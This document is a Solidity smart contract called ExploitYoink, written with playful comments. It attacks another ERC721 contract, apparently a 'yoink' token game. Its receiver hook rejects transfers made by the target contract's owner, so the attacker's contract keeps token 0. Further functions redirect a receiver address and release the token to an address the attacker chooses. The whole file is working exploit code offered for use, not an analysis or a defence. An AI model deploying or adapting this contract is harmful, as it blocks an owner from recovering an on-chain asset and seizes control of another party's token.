// SPDX-License-Identifier: CC0-1.0
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/token/ERC721/ERC721.sol';
import '@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

contract ExploitYoink is Ownable, IERC721Receiver {
	address immutable target;
	bool public yoinkPowerExtractionActivated = true;
	address _yoinkPowerReceiver;

	constructor(address _target) {
		target = _target;
	}

	// Yoink-Chain Power Extraction Technology (patent pending)
	function onERC721Received(
		address operator,
		address,
		uint256,
		bytes calldata
	) public view returns (bytes4) {
		if (
			Ownable(target).owner() == operator &&
			yoinkPowerExtractionActivated == true
		) {
			return 0;
		}
		return IERC721Receiver.onERC721Received.selector;
	}

	function toggleYoinkPowerExtraction() external onlyOwner {
		yoinkPowerExtractionActivated = !yoinkPowerExtractionActivated;
	}

	// WARNING! MUST RECEIVE FAILED YOINK TO PROPERLY PRIME EXTRACTION CHAMBER!
	// FAILURE TO DO SO BEFORE REDIRECTING IS UNTESTED AND MAY RESULT IN UNTIMELY DEATH
	function redirectYoinkPowerTo(address to) external onlyOwner {
		_yoinkPowerReceiver = to;
	}

	function yoinkPowerReceiver() public view returns (address) {
		if (ERC721(target).ownerOf(0) == address(this)) {
			return _yoinkPowerReceiver;
		}
		return address(0);
	}

	function releaseTarget(address to) public onlyOwner {
		yoinkPowerExtractionActivated = false;
		IERC721(target).transferFrom(address(this), to, 0);
	}
}
